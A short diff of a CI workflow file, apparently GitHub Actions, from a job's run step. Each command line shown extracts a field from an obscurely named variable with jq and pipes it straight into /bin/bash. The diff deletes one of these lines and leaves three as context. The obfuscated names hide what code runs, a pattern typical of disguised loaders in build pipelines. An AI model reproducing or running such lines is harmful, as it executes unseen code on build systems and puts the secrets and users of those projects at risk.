@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$i3699" | jq -r .zzhp2298 | /bin/bash
           echo $j701 | jq -r .u5 | /bin/bash
-          printf '%s' "$wzpej20" | jq -r .lpo56473 | /bin/bash
           echo $heoqt672 | jq -r .oz14 | /bin/bash
 
       - name: Archive results
